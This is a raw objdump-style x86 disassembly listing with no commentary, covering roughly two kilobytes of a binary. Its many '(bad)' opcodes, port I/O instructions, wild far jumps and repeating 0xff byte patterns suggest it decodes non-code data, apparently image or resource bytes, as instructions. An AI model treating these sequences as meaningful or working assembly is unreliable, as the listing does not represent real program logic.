  40dd3e:	in     eax,dx
  40dd3f:	(bad)  
  40dd40:	jmp    0x40dd2d
  40dd42:	jmp    0x40dd43
  40dd44:	jmp    0xe8e8:0xe8ffeaea
  40dd4b:	jmp    esi
  40dd4d:	out    0xe6,al
  40dd4f:	jmp    esp
  40dd51:	in     al,0xe4
  40dd53:	jmp    edx
  40dd55:	loop   0x40dd39
  40dd57:	jmp    eax
  40dd59:	loopne 0x40dd3b
  40dd5b:	(bad)  
  40dd5c:	(bad)  
  40dd5e:	fdivp  st(7),st
  40dd60:	fstp   st(5)
  40dd62:	(bad)  
  40dd64:	fcmovnu st,st(3)
  40dd66:	(bad)  
  40dd68:	(bad)  
  40dd6a:	fcos   
  40dd6c:	xlat   BYTE PTR ds:[ebx]
  40dd6d:	xlat   BYTE PTR ds:[ebx]
  40dd6e:	xlat   BYTE PTR ds:[ebx]
  40dd6f:	call   ebp
  40dd71:	aad    0xd5
  40dd73:	call   esp
  40dd75:	aam    0xd4
  40dd77:	call   edx
  40dd79:	rcl    dl,cl
  40dd7b:	call   eax
  40dd7d:	rcl    al,1
  40dd7f:	dec    esi
  40dd81:	into   
  40dd82:	into   
  40dd83:	push   DWORD PTR [eax+0x78ffb0b0]
  40dd89:	js     0x40de03
  40dd8b:	int3   
  40dd8c:	sub    eax,0x322d2d
  40dd91:	add    BYTE PTR [eax],al
  40dd93:	pop    es
  40dd94:	add    BYTE PTR [eax],al
  40dd96:	add    BYTE PTR [ecx],al
	...
  40ddb4:	(bad)  
  40ddb5:	(bad)  
  40ddb6:	inc    DWORD PTR [eax]
  40ddb8:	ja     0x40de31
  40ddba:	ja     0x40de08
  40ddbc:	mov    dh,0xc6
  40ddbf:	push   eax
  40ddc1:	lock lock (bad) 
  40ddc4:	fcmovnu st,st(3)
  40ddc6:	(bad)  
  40ddc8:	(bad)  
  40ddc9:	(bad)  
  40ddca:	(bad)  
  40ddcb:	call   esi
  40ddcd:	(bad)  
  40ddce:	(bad)  
  40ddcf:	jmp    DWORD PTR [esi-0x5e008687]
  40ddd5:	outs   dx,BYTE PTR ds:[esi]
  40ddd6:	outs   dx,BYTE PTR ds:[esi]
  40ddd7:	jmp    DWORD PTR [ebx-0x5a008f90]
  40dddd:	jb     0x40de51
  40dddf:	jmp    FWORD PTR [eax-0x55008a8b]
  40dde5:	ja     0x40de5e
  40dde7:	jmp    FWORD PTR [ecx+edi*2+0x7baeff79]
  40ddee:	jnp    0x40ddef
  40ddf0:	mov    ecx,0xc2ff8c8c
  40ddf5:	pushf  
  40ddf6:	pushf  
  40ddf7:	call   edx
  40ddf9:	mov    ecx,0xc0d6ffb9
  40ddfe:	sar    bh,0xe0
  40de01:	rcl    ebx,cl
  40de03:	(bad)  
  40de04:	call   0xeb40c3ee
  40de09:	jmp    0xffe8:0xe8e8ffea
  40de10:	out    0xe6,al
  40de12:	out    0xff,al
  40de14:	in     al,0xe4
  40de16:	in     al,0xff
  40de18:	loop   0x40ddfc
  40de1a:	loop   0x40de1b
  40de1c:	loopne 0x40ddfe
  40de1e:	loopne 0x40de1f
  40de20:	(bad)  
  40de22:	fdivp  st(7),st
  40de24:	fstp   st(5)
  40de26:	(bad)  
  40de28:	fcmovnu st,st(3)
  40de2a:	(bad)  
  40de2c:	(bad)  
  40de2e:	fcos   
  40de30:	xlat   BYTE PTR ds:[ebx]
  40de31:	xlat   BYTE PTR ds:[ebx]
  40de32:	xlat   BYTE PTR ds:[ebx]
  40de33:	call   ebp
  40de35:	aad    0xd5
  40de37:	call   esp
  40de39:	aam    0xd4
  40de3b:	call   edx
  40de3d:	rcl    dl,cl
  40de3f:	jmp    FWORD PTR [edi+0x67ffafaf]
  40de45:	addr16 addr16 cdq 
  40de48:	add    BYTE PTR [eax],al
  40de4a:	add    BYTE PTR [edx],bl
  40de4c:	add    BYTE PTR [eax],al
  40de4e:	add    BYTE PTR [edi+edi*8],al
  40de51:	(bad)  
  40de52:	inc    DWORD PTR [eax]
	...
  40de74:	add    BYTE PTR [eax],al
  40de76:	add    BYTE PTR [ecx],al
  40de78:	jae    0x40deed
  40de7a:	jae    0x40dedf
  40de7c:	(bad)  
  40de7d:	(bad)  
  40de7e:	(bad)  
  40de7f:	(bad)  
  40de80:	(bad)  
  40de82:	fdiv   st(7),st
  40de84:	(bad)  
  40de86:	fdiv   st(7),st
  40de88:	(bad)  
  40de8a:	fdiv   st(7),st
  40de8c:	int    0xc0
  40de8e:	sar    bh,0xa1
  40de91:	outs   dx,BYTE PTR ds:[esi]
  40de92:	outs   dx,BYTE PTR ds:[esi]
  40de93:	jmp    DWORD PTR [ebx-0x5a008f90]
  40de99:	jb     0x40df0d
  40de9b:	jmp    FWORD PTR [eax-0x55008a8b]
  40dea1:	ja     0x40df1a
  40dea3:	jmp    FWORD PTR [ecx+edi*2+0x7baeff79]
  40deaa:	jnp    0x40deab
  40deac:	mov    al,0x7d
  40deae:	jge    0x40deaf
  40deb0:	mov    dl,0x7f
  40deb2:	jg     0x40deb3
  40deb4:	mov    ah,0x81
  40deb6:	cmp    edi,0xff8383b6
  40debc:	mov    eax,0xbaff8585
  40dec1:	xchg   DWORD PTR [edi-0x76764301],eax
  40dec7:	(bad)  
  40dec8:	mov    edi,0xcbff8c8c
  40decd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dece:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40decf:	call   ecx
  40ded1:	mov    cl,0xb1
  40ded3:	call   ebp
  40ded5:	mov    ebx,0xdde0ffbb
  40deda:	(bad)  
  40dedc:	loop   0x40dec0
  40dede:	loop   0x40dedf
  40dee0:	loopne 0x40dec2
  40dee2:	loopne 0x40dee3
  40dee4:	(bad)  
  40dee6:	fdivp  st(7),st
  40dee8:	fstp   st(5)
  40deea:	(bad)  
  40deec:	fcmovnu st,st(3)
  40deee:	(bad)  
  40def0:	(bad)  
  40def2:	fcos   
  40def4:	xlat   BYTE PTR ds:[ebx]
  40def5:	xlat   BYTE PTR ds:[ebx]
  40def6:	xlat   BYTE PTR ds:[ebx]
  40def7:	call   ecx
  40def9:	rcl    ecx,1
  40defb:	call   FWORD PTR [edi+0x4ff99f9f]
  40df01:	dec    edi
  40df02:	dec    edi
  40df03:	je     0x40df05
  40df05:	add    BYTE PTR [eax],al
  40df07:	adc    DWORD PTR [eax],eax
  40df09:	add    BYTE PTR [eax],al
  40df0b:	add    eax,DWORD PTR [eax]
	...
  40df2d:	add    BYTE PTR [eax],al
  40df2f:	add    bh,bh
  40df31:	(bad)  
  40df32:	inc    DWORD PTR [eax]
  40df34:	add    BYTE PTR [eax],al
  40df36:	add    BYTE PTR ds:0xb2888888,al
  40df3c:	loop   0x40df20
  40df3e:	loop   0x40df3f
  40df40:	loop   0x40df24
  40df42:	loop   0x40df43
  40df44:	loop   0x40df28
  40df46:	loop   0x40df47
  40df48:	loop   0x40df2c
  40df4a:	loop   0x40df4b
  40df4c:	loop   0x40df05
  40df4e:	mov    bh,bh
  40df50:	rcl    DWORD PTR [ebx-0x6c33009c],1
  40df56:	jo     0x40df57
  40df58:	mov    ebp,0xb4ff7788
  40df5d:	cmp    DWORD PTR [eax-0x1],0xff7979ac
  40df64:	scas   al,BYTE PTR es:[edi]
  40df65:	jnp    0x40dfe2
  40df67:	push   DWORD PTR [eax-0x4d008283]
  40df6d:	jg     0x40dfee
  40df6f:	push   DWORD PTR [ecx+eax*4-0x7c49007f]
  40df76:	cmp    edi,0xffffffb8
  40df79:	test   DWORD PTR [ebp-0x78784501],eax
  40df7f:	(bad)  
  40df80:	mov    esp,0xbfff8989
  40df85:	mov    WORD PTR [edi+edi*8-0x71713f],cs
  40df8c:	ret    
  40df8d:	nop
  40df8e:	nop
  40df8f:	inc    esp
  40df91:	xchg   ecx,eax
  40df92:	xchg   ecx,eax
  40df93:	inc    edi
  40df95:	xchg   esp,eax
  40df96:	xchg   esp,eax
  40df97:	(bad)  
  40df98:	fcmovne st,st(6)
  40df9a:	into   
  40df9b:	(bad)  
  40df9c:	jmp    0xf240c98a
  40dfa1:	icebp  
  40dfa2:	icebp  
  40dfa3:	push   esi
  40dfa5:	div    dh
  40dfa7:	push   edi
  40dfa9:	div    edi
  40dfab:	push   eax
  40dfad:	lock lock (bad) 
  40dfb0:	in     eax,dx
  40dfb1:	in     eax,dx
  40dfb2:	in     eax,dx
  40dfb3:	jmp    ebp
  40dfb5:	jecxz  0x40df9a
  40dfb7:	dec    DWORD PTR [edi+0xff78f8f]
  40dfbd:	(bad)  
  40dfbe:	setg   BYTE PTR [eax]
  40dfc1:	add    BYTE PTR [eax],al
  40dfc3:	cmp    DWORD PTR [eax],eax
  40dfc5:	add    BYTE PTR [eax],al
  40dfc7:	pop    es
	...
  40dff0:	(bad)  
  40dff1:	(bad)  
  40dff2:	inc    DWORD PTR [eax]
  40dff4:	dec    ecx
  40dff5:	dec    ecx
  40dff6:	dec    ecx
  40dff7:	and    BYTE PTR [edi-0x16004849],dh
  40dffd:	jmp    0xea2adfeb
  40e002:	jmp    0xea2aca06
  40e007:	(bad)  
  40e008:	jmp    0x61b9:0xfdffdfe5
  40e00f:	(bad)  
  40e010:	(bad)  
  40e011:	mov    esp,0xc0ffff69
  40e016:	jne    0x40e017
  40e018:	inc    ebp
  40e01a:	test   bh,bh
  40e01c:	dec    ebx
  40e01e:	xchg   ebp,eax
  40e01f:	(bad)  
  40e020:	dec    esp
  40e022:	cdq    
  40e023:	push   ebp
  40e025:	ret    0xff98
  40e028:	in     al,dx
  40e029:	mov    ecx,0xb0e3ff97
  40e02e:	xchg   ebp,eax
  40e02f:	(bad)  
  40e030:	fisub  DWORD PTR [edi-0x602d006d]
  40e036:	xchg   edx,eax
  40e037:	dec    ebx
  40e039:	cwde   
  40e03a:	nop
  40e03b:	inc    eax
  40e03d:	lea    ecx,[ebx-0x73734001]
  40e043:	inc    ecx
  40e045:	mov    cs,WORD PTR [esi-0x6f6f3c01]
  40e04b:	inc    esp
  40e04d:	xchg   ecx,eax
  40e04e:	xchg   ecx,eax
  40e04f:	inc    edi
  40e051:	xchg   esp,eax
  40e052:	xchg   esp,eax
  40e053:	dec    ecx
  40e055:	xchg   esi,eax
  40e056:	xchg   esi,eax
  40e057:	jmp    edx
  40e059:	aad    0xd5
  40e05b:	push   ecx
  40e05d:	icebp  
  40e05e:	icebp  
  40e05f:	(bad)  
  40e060:	stc    
  40e061:	stc    
  40e062:	stc    
  40e063:	(bad)  
  40e064:	(bad)  
  40e065:	(bad)  
  40e066:	(bad)  
  40e067:	(bad)  
  40e068:	(bad)  
  40e069:	clc    
  40e06a:	clc    
  40e06b:	(bad)  
  40e06c:	push   eax
  40e06e:	lock (bad) 
  40e070:	(bad)  
  40e071:	jmp    0xffe7:0xe7ffffea
  40e078:	lods   al,BYTE PTR ds:[esi]
  40e079:	test   al,0xa8
  40e07b:	dec    DWORD PTR [esi]
  40e07d:	push   cs
  40e07e:	push   cs
  40e07f:	lods   eax,DWORD PTR ds:[esi]
  40e080:	add    BYTE PTR [eax],al
  40e082:	add    BYTE PTR [ebx+0x0],bl
  40e085:	add    BYTE PTR [eax],al
  40e087:	adc    eax,DWORD PTR [eax]
	...
  40e0b1:	add    BYTE PTR [eax],al
  40e0b3:	add    DWORD PTR [eax+0x78],edi
  40e0b6:	js     0x40e12d
  40e0b8:	in     al,0xe4
  40e0ba:	in     al,0xff
  40e0bc:	out    dx,eax
  40e0bd:	out    dx,eax
  40e0be:	out    dx,eax
  40e0bf:	(bad)  
  40e0c0:	out    dx,eax
  40e0c1:	out    dx,eax
  40e0c2:	out    dx,eax
  40e0c3:	(bad)  
  40e0c4:	out    dx,eax
  40e0c5:	out    dx,eax
  40e0c6:	out    dx,eax
  40e0c7:	push   ebp
  40e0c9:	fidiv  DWORD PTR [edi+0x69bcffff]
  40e0cf:	(bad)  
  40e0d0:	inc    eax
  40e0d2:	jne    0x40e0d3
  40e0d4:	inc    ebp
  40e0d6:	test   bh,bh
  40e0d8:	dec    ebx
  40e0da:	xchg   ebp,eax
  40e0db:	(bad)  
  40e0dc:	dec    esp
  40e0de:	cdq    
  40e0df:	(bad)  
  40e0e0:	dec    esp
  40e0e2:	pushf  
  40e0e3:	(bad)  
  40e0e4:	dec    esp
  40e0e6:	sahf   
  40e0e7:	(bad)  
  40e0e8:	dec    esp
  40e0ea:	mov    eax,ds:0xa4ccffff
  40e0ef:	(bad)  
  40e0f0:	dec    esp
  40e0f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0f3:	(bad)  
  40e0f4:	dec    esp
  40e0f6:	test   eax,0xabccffff
  40e0fb:	(bad)  
  40e0fc:	dec    esp
  40e0fe:	scas   al,BYTE PTR es:[edi]
  40e0ff:	(bad)  
  40e100:	dec    esp
  40e102:	mov    cl,0xff
  40e104:	hlt    
  40e105:	shr    DWORD PTR [edi+edi*8-0x524210],0xe6
  40e10d:	mov    bl,0xa9
  40e10f:	jmp    esp
  40e111:	mov    cl,0xa9
  40e113:	(bad)  
  40e114:	fld    TBYTE PTR [eax-0x2212005c]
  40e11a:	fdiv   st(7),st
  40e11c:	cli    
  40e11d:	out    0xe7,eax
  40e11f:	(bad)  
  40e120:	jmp    ebx
  40e122:	jecxz  0x40e123
  40e124:	(bad)  
  40e125:	(bad)  
  40e127:	(bad)  
  40e128:	(bad)  
  40e129:	fstp   st(5)
  40e12b:	(bad)  
  40e12c:	jmp    ebx
  40e12e:	jecxz  0x40e12f
  40e130:	(bad)  
  40e131:	call   0xef40e11e
  40e136:	out    dx,al
  40e137:	call   esi
  40e139:	iret   
  40e13a:	iret   
  40e13b:	dec    DWORD PTR [esp+ecx*2+0x4c]
  40e13f:	(bad)  
  40e140:	add    BYTE PTR [eax],al
  40e142:	add    BYTE PTR [edx+0x28000000],al
  40e148:	add    BYTE PTR [eax],al
  40e14a:	add    BYTE PTR [ebx],al
	...
  40e170:	add    BYTE PTR [eax],al
  40e172:	add    BYTE PTR [ecx],cl
  40e174:	test   al,0xa8
  40e176:	test   al,0xda
  40e178:	div    dh
  40e17a:	idiv   bh
  40e17c:	div    dh
  40e17e:	idiv   bh
  40e180:	div    dh
  40e182:	idiv   bh
  40e184:	div    dh
  40e186:	idiv   bh
  40e188:	cld    
  40e189:	retf   
  40e18a:	(bad)  
  40e18b:	(bad)  
  40e18c:	inc    eax
  40e18e:	jne    0x40e18f
  40e190:	inc    ebp
  40e192:	test   bh,bh
  40e194:	dec    ebx
  40e196:	xchg   ebp,eax
  40e197:	(bad)  
  40e198:	dec    esp
  40e19a:	cdq    
  40e19b:	(bad)  
  40e19c:	dec    esp
  40e19e:	pushf  
  40e19f:	(bad)  
  40e1a0:	dec    esp
  40e1a2:	sahf   
  40e1a3:	(bad)  
  40e1a4:	dec    esp
  40e1a6:	mov    eax,ds:0xa4ccffff
  40e1ab:	(bad)  
  40e1ac:	dec    esp
  40e1ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1af:	(bad)  
  40e1b0:	dec    esp
  40e1b2:	test   eax,0xabccffff
  40e1b7:	(bad)  
  40e1b8:	dec    esp
  40e1ba:	scas   al,BYTE PTR es:[edi]
  40e1bb:	(bad)  
  40e1bc:	dec    esp
  40e1be:	mov    cl,0xff
  40e1c0:	dec    esp
  40e1c2:	mov    bl,0xff
  40e1c4:	dec    esp
  40e1c6:	mov    dh,0xff
  40e1c8:	dec    esp
  40e1ca:	mov    ecx,0xbbccffff
  40e1cf:	(bad)  
  40e1d0:	dec    esp
  40e1d2:	mov    esi,0xc1ccffff
  40e1d7:	jmp    esp
  40e1d9:	mov    esi,0xd3ffffb9
  40e1de:	sar    edi,cl
  40e1e0:	call   edi
  40e1e2:	xlat   BYTE PTR ds:[ebx]
  40e1e3:	(bad)  
  40e1e4:	(bad)  
  40e1e5:	(bad)  
  40e1e7:	(bad)  
  40e1e8:	jmp    esp
  40e1ea:	in     al,0xff
  40e1ec:	(bad)  
  40e1ed:	call   0xf040e1da
  40e1f2:	out    dx,eax
  40e1f3:	(bad)  
  40e1f4:	push   ebp
  40e1f6:	cmc    
  40e1f7:	(bad)  
  40e1f8:	(bad)  
  40e1f9:	stc    
  40e1fa:	stc    
  40e1fb:	dec    DWORD PTR [ebx+0xf78b8b]
  40e201:	add    BYTE PTR [eax],al
  40e203:	sahf   
  40e204:	add    BYTE PTR [eax],al
  40e206:	add    BYTE PTR [eax+0x0],cl
  40e209:	add    BYTE PTR [eax],al
  40e20b:	or     eax,0x0
	...
  40e230:	bound  esp,QWORD PTR [edx+0x62]
  40e233:	xor    ebp,edx
  40e235:	aad    0xd5
  40e237:	(bad)  
  40e238:	cld    
  40e239:	cld    
  40e23a:	cld    
  40e23b:	(bad)  
  40e23c:	cld    
  40e23d:	div    edx
  40e23f:	(bad)  
  40e240:	cld    
  40e241:	loope  0x40e201
  40e243:	(bad)  
  40e244:	std    
  40e245:	rcr    BYTE PTR [ecx+0x75c0ffff],1
  40e24b:	(bad)  
  40e24c:	inc    ebp
  40e24e:	test   bh,bh
  40e250:	dec    ebx
  40e252:	xchg   ebp,eax
  40e253:	(bad)  
  40e254:	dec    esp
  40e256:	cdq    
  40e257:	(bad)  
  40e258:	dec    esp
  40e25a:	pushf  
  40e25b:	(bad)  
  40e25c:	dec    esp
  40e25e:	sahf   
  40e25f:	(bad)  
  40e260:	dec    esp
  40e262:	mov    eax,ds:0xa4ccffff
  40e267:	(bad)  
  40e268:	dec    esp
  40e26a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e26b:	(bad)  
  40e26c:	dec    esp
  40e26e:	test   eax,0xabccffff
  40e273:	(bad)  
  40e274:	dec    esp
  40e276:	scas   al,BYTE PTR es:[edi]
  40e277:	(bad)  
  40e278:	dec    esp
  40e27a:	mov    cl,0xff
  40e27c:	dec    esp
  40e27e:	mov    bl,0xff
  40e280:	dec    esp
  40e282:	mov    dh,0xff
  40e284:	dec    esp
  40e286:	mov    ecx,0xbbccffff
  40e28b:	(bad)  
  40e28c:	dec    esp
  40e28e:	mov    esi,0xc1ccffff
  40e293:	(bad)  
  40e294:	dec    esp
  40e296:	(bad)  
  40e297:	jmp    FWORD PTR [edi-0x1b005f5e]
  40e29d:	mov    edi,0xdedeffff
  40e2a3:	(bad)  
  40e2a4:	jmp    esp
  40e2a6:	in     al,0xff
  40e2a8:	(bad)  
  40e2a9:	call   0xf040e296
  40e2ae:	out    dx,eax
  40e2af:	(bad)  
  40e2b0:	push   ebp
  40e2b2:	cmc    
  40e2b3:	(bad)  
  40e2b4:	(bad)  
  40e2b5:	stc    
  40e2b6:	stc    
  40e2b7:	(bad)  
  40e2b8:	(bad)  
  40e2b9:	(bad)  
  40e2ba:	(bad)  
  40e2bb:	dec    ecx
  40e2bd:	leave  
  40e2be:	leave  
  40e2bf:	push   DWORD PTR [eax]
  40e2c1:	xor    BYTE PTR [eax],dh
  40e2c3:	les    eax,FWORD PTR [eax]
  40e2c5:	add    BYTE PTR [eax],al
  40e2c7:	jb     0x40e2c9
  40e2c9:	add    BYTE PTR [eax],al
  40e2cb:	pop    ds
  40e2cc:	add    BYTE PTR [eax],al
  40e2ce:	add    BYTE PTR [ecx],al
	...
  40e2f0:	(bad)  
  40e2f1:	(bad)  
  40e2f2:	(bad)  
  40e2f3:	xchg   esi,eax
  40e2f4:	fcomp  st(0)
  40e2f6:	fdivr  st,st(7)
  40e2f8:	mov    bh,0xb7
  40e2fa:	mov    bh,0xff
  40e2fc:	push   DWORD PTR [esi-0x430000a9]
  40e302:	imul   edi,edi,0xff75c0ff
  40e308:	inc    ebp
  40e30a:	test   bh,bh
  40e30c:	dec    ebx
  40e30e:	xchg   ebp,eax
  40e30f:	(bad)  
  40e310:	dec    esp
  40e312:	cdq    
  40e313:	(bad)  
  40e314:	dec    esp
  40e316:	pushf  
  40e317:	(bad)  
  40e318:	dec    esp
  40e31a:	sahf   
  40e31b:	(bad)  
  40e31c:	dec    esp
  40e31e:	mov    eax,ds:0xa4ccffff
  40e323:	(bad)  
  40e324:	dec    esp
  40e326:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e327:	(bad)  
  40e328:	dec    esp
  40e32a:	test   eax,0xabccffff
  40e32f:	(bad)  
  40e330:	dec    esp
  40e332:	scas   al,BYTE PTR es:[edi]
  40e333:	(bad)  
  40e334:	dec    esp
  40e336:	mov    cl,0xff
  40e338:	dec    esp
  40e33a:	mov    bl,0xff
  40e33c:	dec    esp
  40e33e:	mov    dh,0xff
  40e340:	dec    esp
  40e342:	mov    ecx,0xbbccffff
  40e347:	(bad)  
  40e348:	dec    esp
  40e34a:	mov    esi,0xc1ccffff
  40e34f:	(bad)  
  40e350:	dec    esp
  40e352:	(bad)  
  40e353:	(bad)  
  40e354:	dec    esp
  40e356:	(bad)  
  40e357:	push   DWORD PTR [ebx+0x73]
  40e35a:	jae    0x40e33f
  40e35c:	stos   BYTE PTR es:[edi],al
  40e35d:	mov    eax,ds:0xe4ffeca1
  40e362:	in     al,0xff
  40e364:	(bad)  
  40e365:	jmp    0xf140e353
  40e36a:	lock (bad) 
  40e36c:	push   ebp
  40e36e:	cmc    
  40e36f:	(bad)  
  40e370:	(bad)  
  40e371:	sti    
  40e372:	sti    
  40e373:	(bad)  
  40e374:	(bad)  
  40e375:	(bad)  
  40e376:	(bad)  
  40e377:	(bad)  
  40e378:	(bad)  
  40e379:	(bad)  
  40e37a:	(bad)  
  40e37b:	push   edx
  40e37d:	repnz repnz push DWORD PTR [ecx+0x71]
  40e382:	jno    0x40e36d
  40e384:	add    BYTE PTR [eax],al
  40e386:	add    BYTE PTR [esi+0x34000000],cl
  40e38c:	add    BYTE PTR [eax],al
  40e38e:	add    BYTE PTR [edi],al
	...
  40e3b0:	xchg   esp,eax
  40e3b1:	xchg   esp,eax
  40e3b2:	xchg   esp,eax
  40e3b3:	add    BYTE PTR [edx-0x6db57d7e],0x92
  40e3ba:	xchg   edx,eax
  40e3bb:	(bad)  
  40e3bc:	repnz mov bh,0x6e
  40e3bf:	(bad)  
  40e3c0:	inc    eax
  40e3c2:	jne    0x40e3c3
  40e3c4:	inc    ebp
  40e3c6:	test   bh,bh
  40e3c8:	dec    ebx
  40e3ca:	xchg   ebp,eax
  40e3cb:	(bad)  
  40e3cc:	dec    esp
  40e3ce:	cdq    
  40e3cf:	(bad)  
  40e3d0:	dec    esp
  40e3d2:	pushf  
  40e3d3:	(bad)  
  40e3d4:	dec    esp
  40e3d6:	sahf   
  40e3d7:	(bad)  
  40e3d8:	dec    esp
  40e3da:	mov    eax,ds:0xa4ccffff
  40e3df:	(bad)  
  40e3e0:	dec    esp
  40e3e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3e3:	(bad)  
  40e3e4:	dec    esp
  40e3e6:	test   eax,0xabccffff
  40e3eb:	(bad)  
  40e3ec:	dec    esp
  40e3ee:	scas   al,BYTE PTR es:[edi]
  40e3ef:	(bad)  
  40e3f0:	dec    esp
  40e3f2:	mov    cl,0xff
  40e3f4:	dec    esp
  40e3f6:	mov    bl,0xff
  40e3f8:	dec    esp
  40e3fa:	mov    dh,0xff
  40e3fc:	dec    esp
  40e3fe:	mov    ecx,0xbbccffff
  40e403:	(bad)  
  40e404:	dec    esp
  40e406:	mov    esi,0xc1ccffff
  40e40b:	(bad)  
  40e40c:	dec    esp
  40e40e:	(bad)  
  40e40f:	(bad)  
  40e410:	dec    esp
  40e412:	(bad)  
  40e413:	(bad)  
  40e414:	jmp    0x40e3d8
  40e416:	mov    edi,0x555555ff
  40e41b:	(bad)  
  40e41c:	push   0x6a
  40e41e:	push   0xffffff87
  40e420:	(bad)  
  40e422:	sar    edi,1
  40e424:	push   eax
  40e426:	lock (bad) 
  40e428:	push   esi
  40e42a:	idiv   bh
  40e42c:	(bad)  
  40e42d:	cld    
  40e42e:	cld    
  40e42f:	(bad)  
  40e430:	(bad)  
  40e431:	(bad)  
  40e432:	(bad)  
  40e433:	(bad)  
  40e434:	(bad)  
  40e435:	(bad)  
  40e436:	(bad)  
  40e437:	(bad)  
  40e438:	(bad)  
  40e439:	(bad)  
  40e43a:	(bad)  
  40e43b:	(bad)  
  40e43c:	(bad)  
  40e43d:	(bad)  
  40e43e:	(bad)  
  40e43f:	push   DWORD PTR [edi+0x25ffb7b7]
  40e445:	and    eax,0x8325
  40e44a:	add    BYTE PTR [edx],dh
  40e44c:	add    BYTE PTR [eax],al
  40e44e:	add    BYTE PTR [ecx],cl
	...
  40e470:	(bad)  
  40e471:	(bad)  
  40e472:	inc    DWORD PTR [eax]
  40e474:	(bad)  
  40e475:	(bad)  
  40e476:	inc    DWORD PTR [eax]
  40e478:	xchg   esp,eax
  40e479:	xchg   esp,eax
  40e47a:	xchg   esp,eax
  40e47b:	bound  edx,QWORD PTR [eax-0x6e796f70]
  40e481:	xchg   ecx,eax
  40e482:	xchg   ecx,eax
  40e483:	mov    dh,0x92
  40e485:	xchg   edx,eax
  40e486:	xchg   edx,eax
  40e487:	(bad)  
  40e488:	stos   BYTE PTR es:[edi],al
  40e489:	lahf   
  40e48a:	xchg   edx,eax
  40e48b:	(bad)  
  40e48c:	mov    dl,0xa5
  40e48e:	cdq    
  40e48f:	(bad)  
  40e490:	mov    eax,0xccff9aa8
  40e495:	mov    dl,0x9c
  40e497:	dec    esp
  40e499:	mov    dl,0x9e
  40e49b:	(bad)  
  40e49c:	fdivr  DWORD PTR [ecx-0x401a005f]
  40e4a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4a3:	jmp    ebp
  40e4a5:	mov    edi,0xccffffa6
  40e4aa:	scas   al,BYTE PTR es:[edi]
  40e4ab:	(bad)  
  40e4ac:	dec    esp
  40e4ae:	mov    cl,0xff
  40e4b0:	dec    esp
  40e4b2:	mov    bl,0xff
  40e4b4:	dec    esp
  40e4b6:	mov    dh,0xff
  40e4b8:	dec    esp
  40e4ba:	mov    ecx,0xbbccffff
  40e4bf:	(bad)  
  40e4c0:	dec    esp
  40e4c2:	mov    esi,0xc1ccffff
  40e4c7:	(bad)  
  40e4c8:	dec    esp
  40e4ca:	(bad)  
  40e4cb:	(bad)  
  40e4cc:	dec    esp
  40e4ce:	(bad)  
  40e4cf:	(bad)  
  40e4d0:	dec    esp
  40e4d2:	enter  0xd2ff,0xb5
  40e4d6:	mov    ah,0xff
  40e4d8:	and    esp,DWORD PTR [ebx]
  40e4da:	and    ecx,DWORD PTR [ebx+0x24000000]
  40e4e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4e1:	mov    ds:0xf6ffe1a3,eax
  40e4e6:	idiv   bh
  40e4e8:	(bad)  
  40e4e9:	cld    
  40e4ea:	cld    
  40e4eb:	(bad)  
  40e4ec:	(bad)  
  40e4ed:	(bad)  
  40e4ee:	(bad)  
  40e4ef:	(bad)  
  40e4f0:	(bad)  
  40e4f1:	(bad)  
  40e4f2:	(bad)  
  40e4f3:	jmp    ebp
  40e4f5:	in     eax,0xe5
  40e4f7:	call   edx
  40e4f9:	rcl    dl,cl
  40e4fb:	(bad)  
  40e4fc:	mov    edi,0xa0ffbfbf
  40e501:	mov    al,ds:0x7878d8a0
  40e506:	js     0x40e56d
  40e508:	add    BYTE PTR [eax],al
  40e50a:	add    BYTE PTR [edi],cl
  40e50c:	add    BYTE PTR [eax],al
  40e50e:	add    BYTE PTR [ebx],al
	...
  40e534:	(bad)  
  40e535:	(bad)  
  40e536:	inc    DWORD PTR [eax]
  40e538:	(bad)  
  40e539:	(bad)  
  40e53a:	inc    DWORD PTR [eax]
  40e53c:	(bad)  
  40e53d:	(bad)  
  40e53e:	inc    DWORD PTR [eax]
  40e540:	add    BYTE PTR [eax],al
  40e542:	add    BYTE PTR [ecx],al
  40e544:	add    BYTE PTR [eax],al
  40e546:	add    BYTE PTR [ecx],al
  40e548:	add    BYTE PTR [eax],al
  40e54a:	add    BYTE PTR [ecx],al
  40e54c:	add    BYTE PTR [eax],al
  40e54e:	add    BYTE PTR [ecx],al
  40e550:	add    BYTE PTR [eax],al
  40e552:	add    BYTE PTR [ecx],al
  40e554:	add    BYTE PTR [eax],al
  40e556:	add    BYTE PTR [ecx],al
  40e558:	xchg   ebx,eax
  40e559:	xchg   ebx,eax
  40e55a:	xchg   ebx,eax
  40e55b:	inc    edx
  40e55c:	mov    DWORD PTR [ecx-0x7575b877],ecx
  40e562:	mov    bl,BYTE PTR [eax-0x70]
  40e565:	nop
  40e566:	nop
  40e567:	xchg   DWORD PTR [esi-0x6e767172],ecx
  40e56d:	xchg   ecx,eax
  40e56e:	xchg   ecx,eax
  40e56f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e570:	fwait
  40e571:	xchg   edi,eax
  40e572:	xchg   esi,eax
  40e573:	(bad)  
  40e574:	mov    ah,0xa3
  40e576:	popf   
  40e577:	(bad)  
  40e578:	mov    bl,0xa5
  40e57a:	mov    eax,ds:0xa6acbff1
  40e57f:	dec    esp
  40e581:	mov    bl,0xad
  40e583:	dec    esp
  40e585:	mov    bl,0xae
  40e587:	jmp    esi
  40e589:	mov    edi,0xbfe6ffbb
  40e58e:	mov    esp,0xc2c2ecff
  40e593:	push   DWORD PTR [ebx+eiz*4+0xeaa3]
  40e59a:	add    BYTE PTR ds:0x10000000,bh
  40e5a0:	xchg   ebp,eax
  40e5a1:	xchg   ebp,eax
  40e5a2:	xchg   ebp,eax
  40e5a3:	bound  edi,QWORD PTR [edi-0x3f004142]
  40e5a9:	rol    al,0xf1
  40e5ac:	test   eax,0x8ac9a9a9
  40e5b1:	mov    cl,BYTE PTR [edx-0x7b7b7b63]
  40e5b7:	outs   dx,DWORD PTR ds:[esi]
